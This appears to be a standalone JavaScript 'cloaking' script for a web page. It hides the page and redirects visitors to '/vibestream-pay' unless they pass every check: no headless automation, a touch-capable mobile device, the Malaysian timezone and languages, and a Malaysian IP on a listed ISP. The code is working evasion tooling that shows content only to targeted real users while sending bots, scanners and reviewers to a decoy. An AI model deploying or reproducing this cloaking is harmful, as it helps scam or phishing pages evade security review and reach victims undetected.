// ADVANCED CLOAKING & DEVICE FILTER
(function() {
  const REDIRECT_URL = '/vibestream-pay';
  const ALLOWED_ISPS = ['Telekom Malaysia', 'Maxis', 'Celcom', 'Digi', 'U Mobile', 'YTL Communications', 'CelcomDigi'];
  
  // IMMEDIATELY HIDE BODY TO PREVENT FLICKER
  document.documentElement.style.display = 'none';

  function redirect() {
    window.location.href = REDIRECT_URL;
  }

  // 1. Skip check for local development
  if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    document.documentElement.style.display = 'block';
    return;
  }

  // 2. DETECT AUTOMATION (Headless Browsers)
  if (navigator.webdriver) return redirect();

  // 3. DESKTOP BLOCKER: Only allow real mobile devices with touch support
  const isMobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const supportsTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
  
  // If NOT mobile OR NOT supporting touch -> BLOCK (Desktop/Bot)
  if (!isMobileUA || !supportsTouch) return redirect();

  // 4. TIMEZONE CHECK (Must be Malaysia)
  const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  if (userTimezone !== 'Asia/Kuala_Lumpur') return redirect();

  // 5. LANGUAGE CHECK (Common in Malaysia)
  const userLang = navigator.language || navigator.userLanguage;
  if (!userLang.includes('en') && !userLang.includes('ms') && !userLang.includes('zh')) return redirect();

  // 6. IP & ISP CHECK
  fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
      const providerInfo = (data.org + ' ' + data.asn).toLowerCase();
      const isMalaysian = data.country_code === 'MY';
      const isAllowedProvider = ALLOWED_ISPS.some(p => providerInfo.includes(p.toLowerCase()));
      
      if (isMalaysian && isAllowedProvider) {
        // SUCCESS: Show the page
        document.documentElement.style.display = 'block';
      } else {
        redirect();
      }
    })
    .catch(() => {
      // If API fails, redirect to be safe
      redirect();
    });

  // Unregister Service Workers
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then(regs => {
      for(let r of regs) r.unregister();
    });
  }
})();
